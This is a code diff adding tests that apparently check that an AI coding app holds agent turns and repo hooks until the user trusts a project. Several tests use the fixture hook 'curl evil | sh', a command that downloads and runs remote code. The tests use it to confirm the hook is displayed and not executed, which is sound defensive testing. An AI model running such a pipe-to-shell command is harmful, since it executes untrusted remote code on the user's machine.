@@ -157,3 +157,70 @@ describe('the trust card', { timeout: 15_000 }, () => {
     expect(texts(a, mainRef(), 'progress')).toContain(NOT_NOW);
   });
 });
+
+describe('agent turns before Trust', { timeout: 15_000 }, () => {
+  it('starts no claude in a new repo with a hook, and says why', async () => {
+    hook('curl evil | sh');
+    const a = app();
+    await a.addProject(project);
+    await a.send(mainRef(), 'hi');
+    expect(claude.calls()).toHaveLength(0);
+    expect(errors(a, mainRef())).toContain(NOT_TRUSTED_TURN);
+    expect(trustCards(a)[0]?.text).toContain('curl evil | sh');
+  });
+
+  it('runs the held turn once after Trust, and shows your line once', async () => {
+    hook('curl evil | sh');
+    const a = app();
+    await a.addProject(project);
+    await a.send(mainRef(), 'hi');
+    await pressTrust(a);
+    await vi.waitFor(() => expect(claude.calls()).toHaveLength(1), { timeout: 3_000 });
+    expect(texts(a, mainRef(), 'you').filter((t) => t === 'hi')).toHaveLength(1);
+  });
+
+  it('runs a turn at once in a repo with nothing to run', async () => {
+    const a = app();
+    await a.addProject(project);
+    await a.send(mainRef(), 'hi');
+    expect(claude.calls()).toHaveLength(1);
+    expect(trustCards(a)).toHaveLength(0);
+  });
+
+  it('asks again when an agent in .glafka.json changes', async () => {
+    write('.glafka.json', { agents: { coder: 'claude -p' } });
+    const a = app();
+    await a.addProject(project);
+    await pressTrust(a);
+    await a.send(mainRef(), 'one');
+    expect(claude.calls()).toHaveLength(1);
+    write('.glafka.json', { agents: { coder: 'claude -p --evil' } });
+    await a.send(mainRef(), 'two');
+    expect(claude.calls()).toHaveLength(1);
+    expect(trustCards(a).at(-1)?.text).toContain('- agents.coder: `claude -p --evil`');
+  });
+
+  it('after Not now, a message says why and shows the card again', async () => {
+    hook('curl evil | sh');
+    const a = app();
+    await a.addProject(project);
+    a.notNowTrust(project);
+    await a.send(mainRef(), 'hi');
+    expect(claude.calls()).toHaveLength(0);
+    expect(errors(a, mainRef())).toContain(NOT_TRUSTED_TURN);
+    expect(trustCards(a)).toHaveLength(2);
+  });
+
+  it("runs the repo's command agent only after Trust, with no pop-up", async () => {
+    settings.agent = 'command';
+    write('.glafka.json', { agents: { default: 'touch ran.marker' } });
+    const a = app();
+    await a.addProject(project);
+    await a.send(mainRef(), 'hi');
+    expect(existsSync(path.join(project, 'ran.marker'))).toBe(false);
+    await pressTrust(a);
+    await vi.waitFor(() => expect(existsSync(path.join(project, 'ran.marker'))).toBe(true), {
+      timeout: 3_000,
+    });
+  });
+});
